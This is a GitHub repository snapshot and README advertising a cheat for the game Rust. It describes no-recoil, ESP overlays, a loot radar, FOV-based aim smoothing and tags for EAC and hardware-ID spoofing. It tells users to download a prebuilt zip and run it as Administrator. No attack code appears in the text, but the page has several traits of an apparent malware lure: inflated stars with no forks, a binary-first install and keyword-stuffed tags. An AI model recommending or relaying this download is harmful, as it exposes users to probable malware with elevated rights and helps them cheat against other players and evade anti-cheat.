---
title: "felix-kimcode2097a2/rust-recoil-script-portable"
owner: "felix-kimcode2097a2"
name: "rust-recoil-script-portable"
fullName: "felix-kimcode2097a2/rust-recoil-script-portable"
description: "Rust No-Recoil Script 2026 — external-readonly HID Mouse Macro with Auto Weapon Detection (Portable Suite): native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release."
sourceUrl: "https://github.com/felix-kimcode2097a2/rust-recoil-script-portable"
stars: 277
forks: 0
language: "CMake"
topics: ["cmake", "cpp", "directx-11", "directx-12", "eac", "hwid-rust", "imgui", "multithreading"]
license: "NOASSERTION"
homepage: "https://felix-kimcode2097a2.github.io/rust-recoil-script-portable/"
defaultBranch: "main"
snapshotDate: "2026-11-23"
pushedAt: "2026-11-23T06:18:22Z"
---

> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。

# Rust No-Recoil Script 2026 — external-readonly HID Mouse Macro with Auto Weapon Detection (Portable Suite)

Rust No-Recoil Script 2026 — external-readonly HID Mouse Macro with Auto Weapon Detection (Portable Suite): native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.

*图片：CI Build*
*图片：Latest Release*
*图片：Total Downloads*
*图片：Stars*
[*图片：Open in Colab*](https://colab.research.google.com/github/felix-kimcode2097a2/rust-recoil-script-portable/blob/main/notebooks/quickstart.ipynb)


---

## Technical Overview

**Rust No-Recoil Script 2026 — external-readonly HID Mouse Macro with Auto Weapon Detection (Portable Suite)** (`rust-recoil-script-portable`) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

> [!IMPORTANT]
> **1-Click Prebuilt Package (No Compiler Required)**: Even though the full source tree (`src/`, `config/`) is included in this repository, end users do **not** need to compile anything. Click the green **Download Portable Release** button above or grab `rust-recoil-script-portable-v1.2.0-win64.zip` directly from **Releases**.

## Precompiled Binary Deployment (Windows x64)

| Platform | Direct Download Package | Checksum Manifest |
| :--- | :--- | :--- |
| **Windows 10 / 11 (64-bit)** | **`rust-recoil-script-portable-v1.2.0-win64.zip`** | `SHA256SUMS.txt` |

1. Download `rust-recoil-script-portable-v1.2.0-win64.zip` from the table above or the **Releases** section.
2. Extract the `.zip` archive into any folder (keep `config/settings.json` next to the launcher).
3. Launch the executable as Administrator.

## Module Inventory

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Viewport Overlay** | Borderless DX11/DX12 composition swapchain with DPI scaling | `INSERT` toggle, custom distance cutoff (`350m`) |
| **Entity & Loot Filter** | Spatial bounding boxes, health/distance readout, rarity tier mask | Live JSON hot-reload (`min_rarity_tier`) |
| **Input Smoothing** | Configurable FOV radius and human-curve interpolation | Adjustable `smoothing_factor` & `fov_radius` |
| **Emergency Unload** | Instant thread teardown and handle release | `END` panic key |

## Configuration (`config/settings.json`)

```json
{
  "version": "1.2.0",
  "renderer": {
    "backend": "dx11",
    "vsync": false,
    "max_fps": 144,
    "dpi_aware": true,
    "toggle_key": "INSERT",
    "panic_key": "END"
  },
  "modules": {
    "visual_overlay": {
      "enabled": true,
      "draw_bounds": true,
      "draw_distance": true,
      "max_distance_m": 350
    },
    "telemetry_hud": {
      "enabled": true,
      "frame_time_graph": false,
      "compact_mode": true
    },
    "input_filter": {
      "enabled": true,
      "smoothing_factor": 1.45,
      "fov_radius": 65.0
    },
    "item_radar": {
      "enabled": true,
      "min_rarity_tier": 2
    }
  }
}
```

## Building from Source

```bash
git clone https://github.com/felix-kimcode2097a2/rust-recoil-script-portable.git
cd rust-recoil-script-portable
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
Indexed tags: rust, rust-external-overlay, rust-external-overlays, rust-runtime-mod, rust-recoil-script, rust-no-recoil, rust-esp, rust-target-assist, rust-smbios-utility, eac-smbios-utility, hwid-smbios-utility-rust, rust-macro, logitech-recoil-script, stash-esp, debug-camera-rust, spider-climb
